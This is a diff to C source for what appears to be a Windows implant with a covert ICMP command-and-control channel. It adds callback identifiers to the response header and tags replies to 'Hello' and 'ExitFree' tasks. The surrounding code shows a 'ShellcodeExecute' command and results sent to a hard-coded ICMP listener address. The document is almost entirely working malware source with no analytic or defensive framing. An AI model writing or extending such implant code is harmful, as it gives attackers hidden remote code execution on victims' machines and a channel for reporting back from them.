@@ -21,6 +21,7 @@ typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
 typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
 {
 	UINT32	TaskId;
+	UINT32	CallbackId;
 	UINT32	ReturnCode;
 	UINT32	ErrorValue;
 	UCHAR	Buffer[0];
@@ -32,6 +33,12 @@ typedef enum
 	ExitFree = 1,
 	ShellcodeExecute = 2
 } CMD ;
+
+typedef enum
+{
+	HelloCbs = 0,
+	ExitFreeCbs = 1
+} CBS ;
 
 typedef struct
 {
@@ -91,6 +98,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					/* Set return buffer header */
 					Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
 					Ret->TaskId     = 0;
+					Ret->CallbackId = 0;
 					Ret->ReturnCode = 0;
 					Ret->ErrorValue = 0;
 
@@ -136,11 +144,13 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 													/* Set return info */
 													Ret->TaskId = Req->TaskId;
+													Ret->CallbackId = HelloCbs;
 													Ret->ReturnCode = Res;
 													Ret->ErrorValue = NtCurrentTeb()->LastErrorValue;
 
 													/* Dispatch response */
 													IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
+													
 													break;
 												case ExitFree:
 													/* Execute TaskExitFree */
@@ -149,11 +159,13 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 													/* Set return info */
 													Ret->TaskId     = Req->TaskId;
+													Ret->CallbackId = ExitFreeCbs;
 													Ret->ReturnCode = 0;
 													Ret->ErrorValue = 0;
 
 													/* Dispatch response */
 													IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
+													
 													break;
 											};
 										};
